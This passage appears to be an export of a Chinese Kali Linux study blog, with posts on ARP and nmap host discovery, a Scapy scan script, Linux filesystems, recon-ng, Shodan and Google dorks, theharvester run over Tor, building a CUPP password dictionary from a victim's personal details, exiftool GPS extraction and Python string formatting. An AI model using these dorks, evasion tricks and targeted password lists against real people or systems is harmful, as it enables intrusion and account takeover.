from&quot; | cut -d&quot; &quot; -f 5 | cut -d&quot;(&quot; -f 2 | cut -d&quot;)&quot; -f 1done 运行脚本arping2.sh 12345678root@jack:~/scripts# sh arping2.sh addr.txt192.168.0.1192.168.0.101192.168.0.102192.168.0.103192.168.0.110192.168.0.113[1]+ 已完成 sh arping1.sh eth0 nmap 神器 nmap是一个超级强大的工具，但是在这里我们不会细说，而只是基于nmap对于二层发现的作用，后面我们会单独介绍 参数:nmap -sn 不对端口进行扫描，只是二层发现，寻找存活IP 1234567891011121314151617181920root@jack:~/scripts# nmap -sn 192.168.0.*Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-29 17:35 CSTNmap scan report for 192.168.0.1Host is up (0.00069s latency).MAC Address: C8:3A:35:4E:4B:B0 (Tenda Technology)Nmap scan report for bogon (192.168.0.102)Host is up (0.52s latency).MAC Address: F8:A4:5F:14:74:FB (Xiaomi Communications)Nmap scan report for 192.168.0.103Host is up (0.52s latency).MAC Address: DC:6D:CD:D1:E4:FA (Guangdong Oppo Mobile Telecommunications)Nmap scan report for bogon (192.168.0.110)Host is up (0.00025s latency).MAC Address: 20:6A:8A:02:BF:19 (Wistron InfoComm Manufacturing(Kunshan)Co.)Nmap scan report for 192.168.0.113Host is up (0.00026s latency).MAC Address: 5C:F9:DD:6A:02:61 (Dell)Nmap scan report for 192.168.0.109Host is up.Nmap done: 256 IP addresses (6 hosts up) scanned in 2.71 seconds 我可以发现nmap的扫描速度明显快于arping，执行时间为５秒，并且扫描出来的的信息比arping详细很多！ 同样nmap也可以从文件中获得ｉｐ地址段并对其进行扫描探测 123root@jack:~/scripts# nmap -iL addr.txt -snNmap done: 7 IP addresses (7 hosts up) scanned in 0.43seconds 运行时间缩短到了0.43秒！ Netdiscover Netdiscover可用于主动发现和被动发现，同样它采用arp协议，通过向目标发送arp包是否响应来判断目标是否存活，当然主动探测很有可能会触发目标的反侦查系统(如果目标有的话)，所以Netdiscover也支持被动发送，Netdiscover对网卡启用混杂模式，收取非本网卡IP地址和非本网卡MAC地址的数据包，并且他的机制是基于广播的，Netdiscover会一直在网络中默默侦听着，等待截取目标发送的arp！这是一种被动的等待，所以比主动的探测或许响应稍慢！ 主动探测 12345678root@jack:/tmp# netdiscover -i eth0 -r 192.168.0.109/24#-i指定在哪个网卡上进行发现#-r指定网络地址段 Currently scanning: Finished! | Screen View: Unique Hosts 1 Captured ARP Req/Rep packets, from 1 hosts. Total size: 60 _____________________________________________________________________________ IP At MAC Address Count Len MAC Vendor y scanni ----------------------------------------------------------------------------- dress 192.168.0.1 08:aa:45:6e:4b:10 01 060 Unknown vendor 被动扫描 12345678#-p将网卡配置为混杂模式，将会抓取非本网卡即整个网络物理空间中所广播的数据包root@jack:/# netdiscover -p Currently scanning: (passive) | Screen View: Unique Hosts 0 Captured ARP Req/Rep packets, from 0 hosts. Total size: 0 _____________________________________________________________________________ IP At MAC Address Count Len MAC Vendor ----------------------------------------------------------------------------- 0x03 Python Scapy Scapy是Python的一个库文件，可以在脚本里进行调用，主要是为Python处理一些网络的处理，可以抓包，以可以单独的创建一个数据包，进行发送，也可以对收集到数据包进行修改然后重放，向网络里注入流量，用Scapy学习网络协议也是不错的选择！ 初次使用Scapy需要安装python-gnuplot的一组件:1root@jack:~# apt-get install python-gnuplot 进入Scapy1234root@jack:~# scapy WARNING: No route found for IPv6 destination :: (no default route?)Welcome to Scapy (2.2.0)&gt;&gt;&gt; 0x04 Python Scapy 脚本实现arp扫描 123456789101112131415161718192021222324252627282930#!/usr/bin/pythonimport logging&apos;&apos;&apos;导入日志&apos;&apos;&apos;import subprocess&apos;&apos;&apos;实现一些系统命令的调用&apos;&apos;&apos;logging.getLogger(&quot;scapy.routime&quot;).setLevel(logging.ERROR)from scapy.all import *&apos;&apos;&apos;导入scapy模块&apos;&apos;&apos;if len(sys.argv)!= 2:&apos;&apos;&apos;如果命令加脚本不等于2，这里不同于bash shell&apos;&apos;&apos; print &quot;Usage .. /arp.display [interface]&quot; print &quot;Usage .. /arp.display.py eth0&quot; print &quot;Example will perfors an ARP scanf of the local subnet to which etho is assigned&quot; sys.exit()interface = str(sys.argv[1])ip = subprocess.check_output(&quot;ifconfig &quot;+interface +&quot; | grep &apos;inet addr&apos;| cut -d&apos;:&apos; -f 2 | cut -d&apos; &apos; -f 1&quot;, shell=True).strip()prefix = ip.split(&apos;.&apos;)[0]+&apos;.&apos;+ip.split(&apos;.&apos;)[1]+&apos;.&apos;+ip.split(&apos;.&apos;)[2]+&apos;.&apos;for addr in range(0, 254): answer = sr1(ARP(pdst=prefix+str(addr)),timeout=0.1,verbose=0)&apos;&apos;&apos;如果不添加timeout参数，那么scapy遇到不存在的p将会一直发包，直到有响应为止，所以我们为其添加timeout参数，超过1秒没响应将放弃，verbose=0表示不显示异常信息=1则会显示&apos;&apos;&apos; if answer == None: pass else: print prefix+str(addr) 0x05 何时用到二层发现 一般只有当渗透到内网以后才会使用基于二层的探测，一般服务器不会安装nmap，也可能没有arping，也有可能没有Netdiscover，也有可能运行不了Python的脚本，但是一般没有可能连以上一个可能都没有，这是不可能的。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[第八章-磁盘与文件系统管理]]></title>
      <url>%2F2016%2F04%2F09%2F%E7%AC%AC%E5%85%AB%E7%AB%A0-%E7%A3%81%E7%9B%98%E4%B8%8E%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%2F</url>
      <content type="text"><![CDATA[0x00 关于Linux文件系统Linux最传统的磁盘文件系统(filesystem)便是EXT2了，而文件系统是建立在硬盘上面的，关于磁盘的物理组成请参考鸟哥的第零章！ 文件系统特性 当磁盘分区完毕以后，因为每种操作系统所配置的文件属性/权限并不相同，而为了使之成为操作系统能够利用的文件系统格式(filesystem)，是需要对其进行格式化的！而每种操作系统所使用的文件系统并不相同，如windows的FAT，linux的EXT2，默认情况下windows是不能识别EXT2的！ 那么文件系统是如何运行的呢？文件系统通常将文件数据分为两部分分别放置子啊不同的区块，权限与属性放置在inode中，实际数据则放置在data block区块中，另外还有一个超级区块(superblock)会记录文件系统的整体信息，包括inode与block的总量，使用量，剩余量等。 每个inode与block都有编号，其意义如下： superblock：记录此 filesystem 的整体信息，包括inode/block的总量、使用量、剩余量， 以及文件系统的格apt/archives/式与相关信息等； inode：记录文件的属性，一个文件占用一个inode，同时记录此文件的数据所在的 block 号码； block：实际记录文件的内容，若文件太大时，会占用多个 block 。 每个inode与block都有编号，而每个文件都会占用一个inode，inode内则有文件数据放置的block号码，(并且一个block只能存放一个文件哦！)文件系统先格式化出inode与block区块，从每个件的inode按顺序读取block内容，这种数据存取方式称为索引式文件系统(indexed allocation),与之对应的便是FAT文件系统了，但是FAT文件系统并没有Inode存在，所以没法将一个文件的所有block在一开始就读取出来，而需要一个一个的将block读取出来，当block太过分散时，便会产生所谓的碎片了，这样文件读取的效率会变得很差，于是我们便要经行碎片整理咯！ Linux文件系统的运行我们知道，所有的数据都要加载到内存后cpu才能对数据进行处理。但是由于磁盘的写入速度要比内存慢很多，频繁的在磁盘中进行数据读写无疑会浪费时间，为了解决这个问题，Linux采用了异步处理(asynchronously)的方式，所谓异步处理:当系统加载一个文件到内存后，如果该文件没有被更动过，则在内存区段的文件数据会被配置为干净(clean)的。 但如果内存中的文件数据被更改过了(例如你用 vi去编辑过这个文件)，此时该内存中的数据会被配置为脏的 (Dirty)。此时所有的动作都还在内存中运行,并没有写入到磁盘中!系统会不定时的将内存中配置为『Dirty』的数据写回磁盘，以保持磁盘与内存数据的一致性。 挂载点(mount point)每个filesystem都有独立的inode/block/superblock等信息，这个文件系统要能够链接到目录树才能被我们利用，而将文件系统与目录树结合的动作我们称为挂载。挂载的重点是:挂载点一定是目录，该目录为进入该文件系统的入口。 Linux支持的文件系统其实整个linux的系统都是通过一个Virtual Filesystem Switch的核心功能取独缺filesystem的，也就是说整个linux认识的filesystem其实都是VFS在进行管理的哦！ 下面是LINUX所支持的常见的文件系统: 传统文件系统:EXT2/MINIX/MS-DOS/FAT/ 日志式文件系统:EXT3 网络文件系统:NFS/SMBFS 想要知道你的 Linux 支持的文件系统有哪些：1root@jack:~# ls -l /lib/modules/$(uname -r)/kernel/fs 系统目前已加载到内存中支持的文件系统则有：1root@jack:~# cat /proc/filesystems 0x01 文件系统的简单操作稍微了解文件系统后我们来看看怎么查询整体文件系统的总容量与每个目录所占用的容量! 磁盘与目录的容量df:列出文件系统的整体磁盘使用量{ 选项与参数(常用):$ df [-hi] filename/directory } 123456root@jack:~# df -h&#123;以人类较易阅读的格式自行显示&#125;文件系统 容量 已用 可用 已用% 挂载点udev 10M 0 10M 0% /devtmpfs 1.2G 9.3M 1.1G 1% /run/dev/sda13 48G 8.6G 37G 19% / 12345root@jack:~# df -i&#123; 不用硬盘容量，而以inode的数量来显示 &#125;文件系统 Inode 已用(I) 可用(I) 已用(I)% 挂载点udev 721418 478 720940 1% /devtmpfs 724058 737 723321 1% /run du:评估文件系统的磁盘使用量{ 选项与参数(常用): $ du [-ahs] F/D } 12root@jack:~# du &#123; 默认情况下，显示【目前所在目录】的文件与目录所占用的磁盘空间 &#125; 实体链接与符号链接：lnlinux下的链接有两种，一种是类似与windows下的快捷方式功能，一种则是透过文件系统的inode连接来产生新文件名，而不是新的文件，这种叫做实体链接(硬链接) 硬链接:通过前面我们知道，每个文件都会占用一个inode，文件内容由inode记录来指向，想要读取文件，必须要经过目录记录的文件名来指向正确的inode号码才能读取！就是说文件名只与目录有关，但是文件内容则与inode有关，那么有没有可能有多个文件名对应到同一个inode号码？有的，那就是hard link：在某个目录下下新增加一个文件链接到某inode号码的关联记录而已！那么硬链接的意义何在？安全！我们可以通过不同的文件名去访问同一个inode指向的文件数据。如果你将任何一个『档名』删除，其实 inode 与 block 都还是存在的！ 此时你可以透过另一个『档名』来读取到正确的文件数据喔！此外，不论你使用哪个『档名』来编辑，最终的结果都会写入到相同的 inode 与 block 中，因此均能进行数据的修改哩！ 至于软链接那就是很简单的事情了，基本可以和windows下的快捷方式划等号的啦! 创建链接 ln:{ 选项与参数: $ ln [-sf] 来源文件 目标文件 } -s: 不添加任何参数就是hard link，-s就是软链接了！ -f: 如果目标文件已经存在，则主动将目标文件直接删除再创建！ 123456789root@jack:/tmp# cp -a /etc/passwd .&#123; 下tmp目录下复制passwd文件 &#125;root@jack:/tmp# du -sb;df -i&#123; 利用du与df来检查当前目录下容量，du-sb是计算整个/tmp底下有多少bytes容量 &#125;18190 .文件系统 Inode 已用(I) 可用(I) 已用(I)% 挂载点udev 721418 478 720940 1% /devtmpfs 724058 737 723321 1% /run/dev/sda13 3194880 343869 2851011 11% / 为passwd创建hard link passwd-hd:123456root@jack:/tmp# ln passwd password-hdroot@jack:/tmp# du -sb;df -i18190 .文件系统 Inode 已用(I) 可用(I) 已用(I)% 挂载点udev 721418 478 720940 1% /devtmpfs 724058 737 723321 1% /run 为passwd创建一个软链接passwd-so:123456root@jack:/tmp# ln -s passwd passwd-soroot@jack:/tmp# lsfcitx-socket-:0passwdpasswd-sopassword-hd 0x02 磁盘分割，格式化，检验与挂载 观察分割状态 lsblk 列出系统上所有的磁盘列表lsblk可以看成是(list block device)的缩写，即列出所有存储装置的意思。 选项与参数{ Usage $: lsblk [-fimpt] [device] } -f：列出该磁盘内文件系统的名称 -p:列出该装置的完整名称 -t:列出装置的详细信息，如磁盘大小等 -i:使用ASCII输出 12345678➜ ~ lsblk NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINTsda 8:0 0 465.8G 0 disk ├─sda1 8:1 0 79G 0 part ├─sda2 8:2 0 1K 0 part ├─sda9 8:9 0 12.6G 0 part /├─sda10 8:10 0 4.1G 0 part /var├─sda11 8:11 0 2.6G 0 part [SWAP] 从输出的信息可以看到: NAME:就是装置的文件名 RM:代表是否可卸载，如光盘，usb SIZE:容量 TYPE：装置类型，硬盘(disk),分割槽(part) MOUTPOINT:挂载点 123456➜ ~ lsblk -fpNAME FSTYPE LABEL UUID MOUNTPOINT/dev/sda ├─/dev/sda1 ntfs 8C8ACC138ACBF7AA ├─/dev/sda2 ├─/dev/sda5 ntfs study 000CF0DD0002AB05 UUID是全区单一识别码，Linux中每个装置都会有一个唯一的UUID码，也可以使用blkid来获得UUID 123➜ ~ blkid /dev/sda1: UUID=&quot;8C8ACC138ACBF7AA&quot; TYPE=&quot;ntfs&quot; PARTUUID=&quot;99d6be52-01&quot;/dev/sda5: LABEL=&quot;study&quot; UUID=&quot;000CF0DD0002AB05&quot; TYPE=&quot;ntfs&quot; PARTUUID=&quot;99d6be52-05&quot; parted列出磁盘的分割表类型等信息知道了所有的文件系统以后，可以使用parted来获得磁盘的分割类型12345678910 ~ parted /dev/sda print Model: ATA HGST HTS725050A7 (scsi)Disk /dev/sda: 500GBSector size (logical/physical): 512B/4096BPartition Table: msdos//磁盘分割类型(MBR/GPT/LOOP/MSDOS)，由于我的是双系统Disk Flags: //下面是分割资料Number Start End Size Type File system Flags 1 1049kB 84.8GB 84.8GB primary ntfs boot 2 84.8GB 500GB 415GB extended lba 磁盘分割分割时请注意MBR分割表请使用fdisk分割，GPT分割表请使用gdisk进行分割，至于分割表的具体格式请使用parted查看。 磁盘格式化 文件系统检验 文件系统挂载/卸载 0x03 设置开机挂载 开机挂载 特殊装置 0x04 设置swap空间 创建swap 使用swap 0x05 文件系统特殊观察与操作 磁盘空间浪费 parted分割]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[RECON-NG]]></title>
      <url>%2F2016%2F04%2F08%2FRECON-NG%2F</url>
      <content type="text"><![CDATA[如果你要expolit请使用Metasploit(Metasploit Framework)，如果你要社会工程请使用Social Engineer Toolkit，如果你要侦查使用Recon-ng吧！ 0x00RECON-NG是一个超级重量级的全特性的WEB侦查(信息收集)框架，它使用Python编写，开源，功能强大，比如我们之前的DNS信息，联系人信息收集，邮件信息收集，以及web页面内容信息收集，几乎我们之前所介绍的被动信息收集RECON-NG都可以完成。但框架并不是全部，框架只是规范，所以它并不会包含太多的细节，所有的细节也都是调用模块来完成的！ RECON-NG也是一个命令行工具，其命令格式与msf一致，目前RECON-NG大概有几十个模块，其强大之处也是得益于这些多种多样的模块！ 0x01 RECON-NG使用方式启动RECON-NG,进入框架命令提示符:1234567root@jack:~# recon-ng[71] Recon modules[7] Reporting modules[2] Import modules[2] Exploitation modules[2] Discovery modules[recon-ng][default] &gt; 如果不知道框架下的命令怎么用的，请输入help查看帮助信息，即查看框架下可以使用的命令: 12345678910111213141516171819202122232425262728293031323334353637383940414243[recon-ng][default] &gt; helpCommands (type [help|?] &lt;topic&gt;):---------------------------------add Adds records to the database &#123;REONG-NG下本身存在有数据库，每次我们查询到的结果也都会保存到数据库中，使用add向某一个数据库中插入数据&#125;back Exits the current context &#123;当我们进入RECON-NG时其提示符是:[recon-ng][default] &gt; ；有时当我进入到一个模块中时，即是进入到了下一层级，便可以使用back来返回了！&#125;delete Deletes records from the database&#123;与add对应哈，能加必能减，能量守恒定律！&#125;exit Exits the frameworkhelp Displays this menukeys Manages framework API keys&#123;recon-ng支持很多网站的API接口，比如SHODAN，google，baidu，通过调用API使用搜索引擎来完成我们的信息搜索！&#125;load Loads specified module&#123;加载新的模块&#125;pdb Starts a Python Debugger session&#123;调用python的debugger对模块进行调试&#125;query Queries the database&#123;查询数据库，后面可以跟标准的sql语句&#125;record Records commands to a resource file&#123;将所有命令保存为resource文件，再在框架命令提示符下使用-r参数执行&#125;reload Reloads all modulesresource Executes commands from a resource filesearch Searches available modules&#123;快速搜索相关联的模块！&#125;set Sets module optionsshell Executes shell commands&#123;通过shell在框架下调用一些复杂的系统命令&#125;show Shows various framework items&#123;显示当前框架的各种信息&#125;snapshots Manages workspace snapshots&#123;为recon-ng创建快照，相当于系统还原点&#125;spool Spools output to a fileunset Unsets module optionsuse Loads specified module&#123;即是使用模块&#125;workspaces Manages workspaces 查看帮助信息: 123456789101112131415161718root@jack:~# recon-ng -husage: recon-ng [-h] [-v] [-w workspace] [-r filename] [--no-check] [--no-analytics]recon-ng - Tim Tomes (@LaNMaSteR53) tjt1980[at]gmail.comoptional arguments: -h, --help show this help message and exit -v, --version show program&apos;s version number and exit -w workspace load/create a workspace&#123;&#123;为RECON-NG设置不同的工作区&#125;&#125; -r filename load commands from a resource file&#123;将经常使用的命令保存在一个文件中，使用-r就可以一次加载并执行了！&#125; --no-check disable version check&#123;默认情况下recon-ng每次启动都会检查升级，使用no-check则不是自检升级&#125; --no-analytics disable analytics reporting&#123;不进行报告分析&#125; 参数使用Terminal提示符环境下rcon-ng的参数使用: recon-ng -w新建一个名为sina(新浪)的工作区12345678root@jack:~# recon-ng -w sina [recon-ng v4.6.3, Tim Tomes (@LaNMaSteR53)] [71] Recon modules[7] Reporting modules[2] Import modules[2] Exploitation modules[2] Discovery modules[recon-ng][sina] &gt; RECON-NG框架命令提示符下参数使用: workspace list在工作区下查看有哪些工作区: 1234567[recon-ng][sina] &gt; workspaces list +------------+ | Workspaces | +------------+ | sina | | default | +------------+ keys查看recong-ng支持哪些网站的api1234567891011121314151617181920212223242526272829[recon-ng][sina] &gt; keys list +---------------------------+ | Name | Value | +---------------------------+ | bing_api | | | builtwith_api | | | facebook_api | | | facebook_password | | | facebook_secret | | | facebook_username | | | flickr_api | | | fullcontact_api | | | google_api | | | google_cse | | | instagram_api | | | instagram_secret | | | ipinfodb_api | | | jigsaw_api | | | jigsaw_password | | | jigsaw_username | | | linkedin_api | | | linkedin_secret | | | pwnedlist_api | | | pwnedlist_iv | | | pwnedlist_secret | | | shodan_api | | | twitter_api | | | twitter_secret | | +---------------------------+ 为RECON-NG添加网站API:{ Usage: keys add } 1[recon-ng][sina] &gt; keys add twitter_api fdsaieljdfjjsfjsfdad.... 显示当前框架下的各种参数信息123456789[recon-ng][sina] &gt; show options Name Current Value Required Description DEBUG False yes enable debugging output NAMESERVER 8.8.8.8 yes nameserver for DNS interrogation PROXY no proxy server (address:port) THREADS 10 yes number of threads (where applicable) TIMEOUT 10 yes socket timeout (seconds) USER-AGENT Recon-ng/v4 yes user-agent string VERBOSE True yes enable verbose output 值得一提的是recon-ng是可以支持代理的，其本质上也是通过调用各种搜索引擎取收集信息的！ 0x02 为recon-ng设置go-agent代理1[recon-ng][sina] &gt; set PROXY 127.0.0.1:8087 网络管理员通过查看访问日志，分析http请求中的UERS-AGENT字段便能知道扫描其网站的具体工具，我们可以通过设置recon-ng下的user-agent对工具发送的http请求的user-agent进行伪装，避免被过早封杀！1234[recon-ng][sina] &gt; set USER-AGENT &quot;IE某一个版本的特有user-agent字段&quot;重置选项:[recon-ng][sina] &gt; unset USER-AGENTUSER-AGENT =&gt; None 参数use:使用模块下面演示常用模块的使用方法: Quriey命令的使用: 未完待续。。。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Kali之搜索引擎]]></title>
      <url>%2F2016%2F03%2F27%2FKali%E4%B9%8B%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%2F</url>
      <content type="text"><![CDATA[没错，就是通过度娘，google，必应等搜索引擎,但是我们今天讲的是语法，搜索引擎的语法!是的今天教你怎么会用搜索引擎！ 0x00 SHODANSHODAN不同于我们所理解的百度，google，它不爬网页页面，而是爬互联上的设备，未来我们将处于一个物联网的世界，家里的电视，冰箱，微波炉，所有带电的东东只要给它一个IP就都能连接互联网，而SHODAN的作用就是找到他们，找到全世界所有联网的设备，当然现在国内也有类似的网站了，比如知道创宇的zoomeye，而于此相对的是，目前物联网领域内的网络安全却是非常薄弱的！ 因为默认密码的存在，你可以登录互联网上一半的设备 SHODAN http://www.shodan.io 建议注册一个shodan账号，非会员只能显示出10个相关信息。 SHOADN 常用参数net对特定的IP进行互联网设备爬取 search net:114.114.114.114 使用country参数爬取某一特定国家 search country:CN 使用city参数爬去城市信息 search country:CN city:beijing 使用port参数搜索开放了22端口的设备 search contry:CN city:beijing port:22 使用os参数过滤操作系统 search country:CN city:beijing port:22 os:linux 使用hostname指定主机名或域名 search country:CN city:beijing port:22 os:linux hostname:baidu.com 用server参数指定服务器端运行的软件 search country:CN city:beijing port:22 os:linux hostname:baidu.com server: Apache 自定义创造字符串搜索 search 200 OK ciso server: IIS country:JP search user:admin pass:admin search linux upnp avtech SHODAN的简单特性 SHODANM的账号信息:API key:每个注册用户都会有一个API key，这样我们就可以在编程中使用其API key集成到程序中，使用其搜索引擎！ firefox基于shodan的插件:shodan firefox add-on 下载安装以后当我们在访问一个网站时，便会自动找到并显示其网站相关信息！ 0x02 Google同样，虽然google也有基于搜索互联网设备的搜索功能(即banner)，但这并不是google的强项，而是基于互联网内容的搜索！ google很强大，正是源于它的强大，所以每次当我使用google搜索时会得到海量的信息，然而对我们有用或者只是其中一小部分，所有我们有必要使用使用一些技巧（过滤指令）对其进行过滤！ 设置倒计时:1search: set timer 30 minutes 显示城市距离1search: city to city distance 显示我的位置和ip1search: what&apos;s my location/ip 绘制多远方程及辅助方程式12search: graph for x^8 : graph for sin(x)+tan(x) 搜索关键字“支付”但过滤另一个关键字”充值”：1srearch: +支付 -充值 善用引号” “搜索一个比较长的内容，但是中间含有空格的，你又想将其作为一个完整的语义，这时我们可以使用””(双引号)将其括起来: 这样会显示含有支付或充值的页面1search:&quot;支付 充值&quot; 基于html网页内容搜索搜索关键字北京，并且html页面的title为电子商务，内容包含法人，电话信息的网站。1search: 北京 intitle:电子商务 intext:法人 intext:电话 找出阿里巴巴网站在北京的联系人。123search: 北京 site:alibaba.com inurl:contactsite:表示要搜索的站点(可以是国家，网站域名)inurl:在浏览器的url带有contact关键字的 搜索python的PDF文档1search: Python filetyep:pdf 搜索指定国家范围的payment关键字1search: payment site:usa 几个好玩的惊喜:123search: google spheresearch: google gravitysearch: zerg rush 0x03 下面开启hacking模式实例一当cicso交换机启用了HTTP访问时，用户是分权限级别的，15级拥有高级权限，利用google搜索可得其交换机内部数据。1search: inurl:&quot;level/15/exec/-/show&quot; 实例二通过google搜索联网设备实现shodan功能 1search:intitle:&quot;netbotz appliance&quot; &quot;ok&quot; 实例三1search: inurl:/admin/login.php 实例四:1search:inurl:qq.txt 实例五12345search: filetype:xls &quot;username|password&quot;``` ##### 实例六这是一个关于Fronpage的漏洞 search: Service.pwd1234567891011121314最后介绍一个google的网站，简单的说就是google引擎搜索语法大全!&gt;https://www.exploit-db.com/---### 0x04 第四大搜索引擎 yandex 俄罗斯&gt; https://www.yandex.com每个搜索引擎都有自己的搜索语法。---### 0x05 Kali命令行实现并发搜索---#### theharvester root@jack:~# theharvester -d microsoft.com -l 500 -b google123456789101112选项与参数:* -d: 搜索域名信息和公司记录，类似dig* -b: 指定搜索引擎[google,googleCSE,bing,bingapi,twitter,googleus,]* -l: 限制并发搜索结果的数量(避免搜索引擎的限制)，默认为每次并发50搜索次数！当然由于众所周时的原因，我们需要墙出去才能使用到theharverstr，但gogent使用的是公用ip，这里我们会启用TOR进行代理哦！ &gt; 进一个小插曲，介绍一个终端复用工具，tmux，谁用谁知道！因为搜索引擎的自我保护机制，同一个IP搜索次数太多时，将会被禁止搜索，所以这时我们就需要用到之前的一个工具了，proxychains，vi查看proxychais配置文件是否已经配置完毕: vi /etc/proxychains.conf12查看tor的侦听端口是否已经开启(tor默认侦听9150端口): root: netstat -pantu | grep 915012现在使用proxychains代理链区调用theharverster去检查microsoft的邮箱记录和主机记录，限制搜索结果数500并指定google进行搜索！ root@jack:~# proxychains theharvester -d microsoft.com -l 500 -b google1234567891011121314151617---### 0x06 Maltego一款综合型的信息收集软件，作为kali十大工具之一，它的不仅拥有图形化界面，并且用户体验也是很棒的，当然他是开源的。首次启动我们需要注册一Maltego的账号此部分未完待续。。。。---### 0x07 其他途径社交网络，工商注册，新闻组/论坛，招聘网站。一个专门记录互联网上过去网页是什么样子的网站(需要FQ):&gt; http://www.archive.org/web/web.php---### 0x08 个人专属的密码字典对于目前阶段，我们破解一个密码的，方式最有效，最便捷的方式莫过于使用字典破解了，个人专属密码字典就是按个人信息生成其专属的密码字典，而CUPP可以个人的信息，并对其进行整理，CUPP是使用python编写的，kali默认不集成,所有我们需要在github上下载安装: root@jack:~# git clone https://github.com/Mebus/cupp.git1使用方法: root@jack:~/cupp# python cupp.py -i[+] Insert the informations about the victim to make a dictionary[插入受害者的个人信息制作字典][+] If you don’t know all the info, just hit enter when asked! ;)[如果不知道的信息，按回车跳过] First Name: vicentSurname: fanNickname: ghaoBirthdate (DDMMYYYY): 18041984 Partners) name: vicentPartners) nickname: fanPartners) birthdate (DDMMYYYY): 09191945 Child’s name: vicentChild’s nickname: fanChild’s birthdate (DDMMYYYY): 09191998 Pet’s name: wangcaiCompany name: peking university Do you want to add some key words about the victim? Y/[N]: yPlease enter the words, separated by comma. [i.e. hacker,juice,black], spaces will be removed: student china geek music football love fuckDo you want to add special chars at the end of words? Y/[N]: yDo you want to add some random numbers at the end of words? Y/[N]yLeet mode? (i.e. leet = 1337) Y/[N]: 1314 [+] Now making a dictionary…[+] Sorting list and removing duplicates…[+] Saving dictionary to vicent .txt, counting 15948 words.[+] Now load your pistolero with vicent .txt and shoot! Good luck!1根据我们输入的特定的个人信息，我们可以看到程序已经生成了一个名为vicent.txt的个人信息字典，其中该字典包含了15948个单词! root@jack:~/cupp# cat vicent.txt tneciV tneciV! tneciV!#! tneciV!##….12345---#### 0x007 METADATAExit信息:所有拍摄的照片都可以获得以下照片信息，比如GPS，相机品牌，快门次数，kali也内置了可以查看图片Exit信息的命令行工具:使用Exiftool查看照片GPS信息: root@jack:~/桌面# exiftool IMG_0026.JPGGPS Altitude : 80 m Above Sea LevelGPS Date/Time : 2015:12:10 12:45:59.17ZGPS Latitude : 86 deg 15’ 43.38” NGPS Longitude : 125 deg 8’ 82.13” EGPS Position : 146 deg 25’ 43.38” N, 225 deg 8’ 42.13” E``` GPS坐标单位(度分秒)的换算方法:度分秒(DMS): E 108度54分22.2秒 N 34度12分60.0秒度(DDD): E 108.90592度 N 34.21630度将度(DDD):108.90592度换算成度分秒(DMS):E E 108度54分22.2秒?$ 将108.90592整数位不变直接取108(度),然后用0.9059360=54.3558,取整数位获得54(分),0.355860=21.348在取整数为21(秒)即得108度54分21秒。$ 将度分秒(DMS)转化成度(DDD):108度54分22.2秒=108+(54/60)+(22.2/3600)=108.90616度 windows下图片METADATA信息查看工具:foca]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Python(1)-字符串格式化]]></title>
      <url>%2F2016%2F03%2F25%2FPython(1)-%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%A0%BC%E5%BC%8F%E5%8C%96%2F</url>
      <content type="text"><![CDATA[0x00单(‘)引号与双引号(“”)并无明显区别，三引号(‘’’)或者(“””)【两者并无明显区别】中的字符可以换行输入文本 0x01 Numbers and Math每种程序语言都有自己的数字和数学表示方法，下面是Python中的数学符号: + plus 加号 - minus 减号 / slash 斜杠/求模 * asterisk 星号/乘号 % percent 模运算中的求余 &lt; less-than &gt; greater-than &lt;= less-than-equal &gt;= greater-than-equal 0x02 Variables and Names (变量和命名)首先需要知道的是Python中并没有常量的概念，python中的数的类型有五种:int,long,float,bool,complex（复数），在编程中变量不过是一个名字，由于程序员们糟糕的记忆，才需要给变量区名，以便区分它们！ 0x03 Python转义字符(Escape Sequences) ESCAPE 作用 \\ Backslash() \‘ SIngle-quote(‘) \” Double-quote(“) \a ASCII bell(BEL) \b ASCII backspace(BS) \f ASCII formfeed(FF) 跳页 \n ASCII linefeed(LF) 换行 \r Carriage Return(CR) 回车 \t Horizontal Tab (TAB) 水平制表符 \v Vertical Tab(VT) 垂直制表符 0x04 模板 “%”格式化字符串时，Python使用一个字符串作为模板，模板中有格式符，这些格式符为真是值预留位置，并说明真实数值应该呈现的格式，Pyhon使用一个tuple将多个值传递给模板，每个值对应一个字符:1print(&quot;i&apos;m %s. i&apos;m %d year old&quot; % (&quot;onejustone&quot;, 3)) 还可以使用词典来传递真实值1print(&quot;i&apos;m % (name)s. i&apos;m %(age)d year old&quot; % &#123; &apos;name&apos;: &apos;onejustone&apos;, &apos;age&apos;:3&#125;) 0x05 格式符 %s 字符串(采用str()的显示) %r 字符串(采用repr()的显示) %c 单个字符 %b 二进制 %d 十进制 %i 十进制 %o 八进制 %x 十六进制 %e 指数(基底为e) %E 指数(基底为E) %f 浮点数 %F 浮点数 %g 指数(e)或者浮点数(根据长度自动显示) %G 指数(E)或者浮点数(根据长度自动显示) %% 字符”%” 格式字符串的语法 %[(name)] [flags] [width].[precision] typecode (name)为名，flags可以+表示右对齐, -表示左对齐, ‘ ‘为一个空格表示在正数的左侧填充一个空格, 或者0表示使用0填充. width表示显示的宽度，precision表示小数点后精度。 如:123456print(&quot;%+10x&quot; % 10) +aprint(&quot;%04d&quot; % 5)0005print(&quot;%6.3f&quot; % 2.4) 2.400 对于width，precision为两个整数，还可以利用“*”，来动态代入这个两个量:12print(&quot;%*.*f&quot; %(8, 5, 5.999))5.99900 注意”%s”和”%r”的区别 在使用“%r”时表示输出自然语言字符串(英文)，使用reper()方法处理对象，而%s使用str()方法处理对象: 它们对数字的处理方式都是相同的: 1234print &quot;this number is %d.&quot; % 22print &apos;this number is %s.&apos; % 22print &apos;this number is %r.&apos; % 22this number is 22. 但以下则不一样 12345678text=&apos;i am %d years old.&apos; % 22print &apos;i said:%s&apos; % texti said:i am 22 years old.print &apos;i said:%r&apos; % texti said:&apos;i am 22 years old.&apos;``` r对其处理的文本加了单引号 * 再来 import datetimed=datetime.date.today()print ‘%s’ % d2016-03-28print ‘%r’ % ddatetime.date(2016, 3, 28)1可见%r打印时可以重现其所代表的对象(rper()) formatter=’%r %r %r %rprint formatter % (formatter,formatter,formatter,formatter)‘%r %r %r %r’ ‘%r %r %r %r’ ‘%r 